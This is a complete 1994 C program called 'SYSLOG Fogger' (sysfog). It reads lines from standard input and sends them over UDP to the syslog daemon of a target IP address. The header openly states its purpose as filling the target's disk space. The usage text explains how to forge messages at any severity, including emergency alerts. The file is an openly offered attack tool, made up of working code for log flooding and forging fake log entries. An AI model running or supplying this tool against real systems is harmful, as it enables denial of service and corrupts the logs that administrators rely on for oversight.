/**************************************************************************
   SYSLOG Fogger - Fill Disk Space, Send Messages, Whatever.

  v1.1 - Written by Matt (panzer@dhp.com) During a boring day, 12 Oct 1994.
	 Much code is stolen from "Unix Network Programming"
	 by W. Richard Stevens.  Buy it if you don't have it.
 **************************************************************************/
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAXLINE 512

dg_cli(fp, sockfd, pserv_addr, servlen)
 FILE *fp;
 int sockfd;
 struct sockaddr *pserv_addr;
 int servlen;
{
  int n;
  char sendline[MAXLINE], recvline[MAXLINE+1];

  while(fgets(sendline, MAXLINE, fp) != NULL) {
    n = strlen(sendline);
    if (sendto(sockfd, sendline, n, 0, pserv_addr, servlen) != n) {
      fprintf(stderr,"dg_cli: sendto error on socket\n");exit(1);}
  }
  if (ferror(fp)) {
    fprintf(stderr,"dg_cli: error reading file\n");exit(1);}
}

main(argc, argv)
int argc;
char *argv[];
{
  int sockfd;
  struct sockaddr_in serv_addr, cli_addr;

  if (argc != 2) {
    printf("\nSYSFOG v1.1  -  (written by panzer@dhp.com)\n");
    printf("Usage: %s target-ip-number\n",argv[0]);
    printf("\n-- Reads STDIN, sends to \"target-ip-numbers\" ");
    printf("syslog daemon.\n");
    printf("To send certain types of messages, use the number found\n");
    printf("below in brackets.  IE, \"<0>This is a LOG_EMERG\"\n");
    printf("-----------------------------------------------------------\n");
    printf("From SUNOS /usr/include/syslog.h\n");
    printf("-----------------------------------------------------------\n");
    printf("LOG_EMERG     0    /* system is unusable */\n");
    printf("LOG_ALERT     1    /* action must be taken immediately */\n");
    printf("LOG_CRIT      2    /* critical conditions */\n");
    printf("LOG_ERR       3    /* error conditions */\n");
    printf("LOG_WARNING   4    /* warning conditions */\n");
    printf("LOG_NOTICE    5    /* normal but signification condition */\n");
    printf("LOG_INFO      6    /* informational */\n");
    printf("LOG_DEBUG     7    /* debug-level messages */\n");
    printf("-----------------------------------------------------------\n\n");
    exit(0);
  }
  bzero((char *) &serv_addr, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = inet_addr(argv[1]);
  serv_addr.sin_port = htons(514);

  /* Open UDP socket */
  if ((sockfd=socket(AF_INET, SOCK_DGRAM,0)) <0) { 
    fprintf(stderr,"sysfog: Can't open UDP Socket\n");exit(1);}

  bzero((char *) &cli_addr, sizeof(cli_addr));
  cli_addr.sin_family = AF_INET;
  cli_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  cli_addr.sin_port = htons(0);
  if (bind(sockfd, (struct sockaddr *) &cli_addr, sizeof(cli_addr)) <0) {
    fprintf(stderr,"sysfog: Can't bind local address\n");exit(1);}

  dg_cli(stdin, sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr));

  close(sockfd);
  exit(0);
}
